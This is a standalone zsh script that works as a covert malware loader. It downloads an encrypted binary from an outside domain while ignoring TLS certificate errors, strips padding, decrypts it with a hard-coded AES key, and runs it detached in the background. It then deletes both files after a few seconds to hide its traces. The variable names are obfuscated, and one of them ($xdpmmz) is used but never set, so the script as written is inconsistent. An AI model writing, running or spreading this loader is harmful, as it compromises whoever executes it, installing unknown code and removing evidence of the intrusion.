#!/bin/zsh
xdpmm=$(mktemp /tmp/xagwvd.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m59bb4df7e6480688.bin" -o "$xdpmmz" || exit 1
tpbgs6=$(stat -f %z "$xdpmmz"); hddx4v5=$(( tpbgs6 - 1699 - 2397 ))
tail -c +$(( 1699 + 1 )) "$xdpmmz" | head -c $hddx4v5 | openssl enc -d -aes-256-cbc -k 67d5f63e342e6af500191637 -out "$xdpmm" 2>/dev/null
[ -s "$xdpmm" ] && chmod 700 "$xdpmm" && ( "$xdpmm" & ) && disown
( sleep 3; rm -f "$xdpmm" "$xdpmmz" ) &>/dev/null &
